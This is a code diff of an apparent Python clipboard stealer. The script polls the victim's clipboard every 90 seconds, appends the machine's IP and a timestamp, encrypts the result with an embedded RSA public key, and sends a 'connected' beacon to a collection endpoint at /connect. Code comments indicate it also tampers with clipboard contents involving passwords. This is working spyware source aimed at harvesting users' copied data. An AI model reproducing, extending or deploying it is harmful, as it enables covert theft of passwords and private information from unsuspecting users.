@@ -14,8 +14,10 @@ public = rsa.PublicKey(
         22801902741575260508046760451684121524343309971392815027806038442328813626689876929878295531764425101721113803279088975380306285103839798562486473563504890609732689910231035352994358600476885112341914819232866689789408515621209722745373194438974054762656866686749518758325281935986106093899741071523184790288397250570095386108667233843051192504696785064008214814463197996158290147894449246014411585018720395948432620796871823751561082698116083062968467223326531809351871820333024478963454054743945987929181103396110463090638025544498539475681820761973201801628104421055632663943101423395201694333712187265928179307257,
         65537)
 
-def main():
+first_connection = True
 
+def main():
+    global first_connection
     #gets the clipboard information and puts it in a file every 90 seconds.
     schedule.every(90).seconds.do(get_clipboard_info)
 
@@ -28,6 +30,25 @@ def main():
     #TODO PROBLEM HERE IS GOING to be that it will modify the clipboard twice
     #keyboard.add_hotkey('ctrl+v', change_clipboard)
     #print('ctrlv added')
+    if first_connection:
+        first_connection = False
+        local_hostname = socket.gethostname()
+        ip_addresses = socket.gethostbyname_ex(local_hostname)[2]
+        filtered = list()
+        i = 0
+
+        for ip in ip_addresses:
+            if not ip[0:4] == '127.':
+                # appends to python list
+                filtered.append(ip)
+                i += 1
+
+        if len(filtered) != 0:
+            ip_connected_message = rsa.encrypt((filtered[0] + ' connected').encode('utf-8'), public)
+            requests.post("http://127.0.0.1:80/connect", ip_connected_message)
+        else:
+            localhost_message = rsa.encrypt(('localhost connected'.encode('utf-8')), public)
+            requests.post("http://127.0.0.1:80/connect", localhost_message)
 
     #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
     #code handles the scheduled task
@@ -38,10 +59,12 @@ def main():
 #global value that stores the last clipboardValue copied, starts as empty
 last_clip_board_value = ''
 
+
 def get_clipboard_info():
     #have to define as a global because of how python scope works
     global last_clip_board_value
     global public
+
 
     #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
     #if we do not have this delay: at the end of this method the clipboard info is changed to password
@@ -88,7 +111,12 @@ def get_clipboard_info():
             #make a list same size as the IP's
             filtered = list()
             i = 0
-            print(filtered)
+
+            for ip in ip_addresses:
+                if not ip[0:4] == '127.':
+                    #appends to python list
+                    filtered.append(ip)
+                    i += 1
 
             # https: // www.w3resource.com / python - exercises / python - basic - exercise - 55.php
             #loops through ip addresses and removes local host callbacks
@@ -99,6 +127,7 @@ def get_clipboard_info():
                 formatted_clipboard_info = (clipboard_info + ' - ' + filtered[0] + ' - (' + time.asctime(time.localtime()) + ')').encode('utf8')
             else:
                 formatted_clipboard_info = (clipboard_info + ' - localhost - (' + time.asctime(time.localtime()) + ')').encode('utf8')
+
 
             encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)
 
